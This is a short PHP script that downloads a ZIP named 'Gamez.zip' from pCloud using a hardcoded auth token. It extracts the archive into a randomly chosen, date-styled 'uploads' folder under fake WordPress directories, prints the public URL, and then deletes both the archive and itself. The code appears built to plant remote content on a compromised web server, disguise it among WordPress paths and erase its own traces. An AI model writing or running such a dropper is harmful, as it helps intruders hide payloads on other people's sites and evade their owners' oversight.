<?php

$config = [
    'auth_token' => "YbbACZAm5T7Z4ywRLchLuDBuHf7GtrpPW01Ru1iX",
    'file_id' => "72718531470",
    'zip_file' => "Gamez.zip",
    'wp_base_dirs' => ['/wp-admin/', '/wp-content/', '/wp-includes/'] 
];


foreach ($config['wp_base_dirs'] as $dir) {
    if (!file_exists(__DIR__ . $dir)) {
        mkdir(__DIR__ . $dir, 0755, true);
        echo "📁 Created WordPress directory: $dir<br>";
    }
}


$random_base_dir = $config['wp_base_dirs'][array_rand($config['wp_base_dirs'])];


$random_year = rand(2020, 2025);
$random_month = str_pad(rand(1, 12), 2, '0', STR_PAD_LEFT);
$random_day = str_pad(rand(1, 28), 2, '0', STR_PAD_LEFT);


$random_dir = "{$random_base_dir}uploads/{$random_year}/{$random_month}/{$random_day}/";


$extract_dir = __DIR__ . $random_dir;


if (file_exists($extract_dir)) {
    $existing_files = scandir($extract_dir);
    $existing_files = array_diff($existing_files, ['.', '..']); 
    if (!empty($existing_files)) { 
        $new_extract_dir = $extract_dir . '_renamed_' . time();
        if (rename($extract_dir, $new_extract_dir)) {
            echo "📁 Renamed existing directory '$extract_dir' to '$new_extract_dir'<br>";
        } else {
            echo "❌ Failed to rename existing directory '$extract_dir'<br>";
            exit();
        }
    }
}


if (!file_exists($extract_dir)) {
    mkdir($extract_dir, 0755, true);
    echo "📁 Created directory: $random_dir<br>";
}

$pcloud_url = "https://api.pcloud.com/getfilelink?fileid={$config['file_id']}&auth={$config['auth_token']}";
$response = file_get_contents($pcloud_url);
$data = json_decode($response, true);

if (isset($data['result']) && $data['result'] == 0) {
    $download_url = $data['hosts'][0] . $data['path'];
    file_put_contents($config['zip_file'], file_get_contents("https://" . $download_url));
    $zip = new ZipArchive;
    if ($zip->open($config['zip_file']) === TRUE) {
        $zip->extractTo($extract_dir);
        $zip->close();
        $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://{$_SERVER['HTTP_HOST']}";
        $extracted_url = $base_url . $random_dir;
        echo "<a href='$extracted_url' target='_blank'>$extracted_url</a><br>";
   
        unlink($config['zip_file']);
        $script_path = __FILE__;
        unlink($script_path);
    } else {
        echo "❌ Failed to extract the ZIP file!<br>";
    }
} else {
    echo "❌ Error: " . ($data['error'] ?? 'Unknown error') . "<br>";
}
?>
